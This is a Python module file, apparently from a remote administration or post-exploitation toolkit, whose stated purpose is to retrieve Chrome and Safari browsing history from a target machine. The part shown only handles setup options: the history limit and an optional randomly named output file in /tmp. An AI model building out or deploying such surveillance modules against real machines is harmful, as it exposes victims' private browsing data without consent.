# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self):
        return {
            "Author:": ["Marten4n6"],
            "Description": "Retrieve browser history (Chrome and Safari).",
            "References": [],
            "Stoppable": False
        }

    def get_setup_messages(self):
        return [
            "History limit (Leave empty for 10): ",
            "Would you like to output to a file? [y/N]: "
        ]

    def setup(self, set_options):
        history_limit = set_options[0]
        output_file = set_options[1].lower()

        if not history_limit:
            history_limit = 10
        if not output_file or output_file == "n":
            output_file = ""
        elif output_file:
            output_file = "/tmp/{}.txt".format(random_string(8))

        if not str(history_limit).isdigit():
            self._view.display_error("Invalid history limit.", "attention")
            return False, None
        else:
            return True, {
                "history_limit": history_limit,
                "output_file": output_file
            }
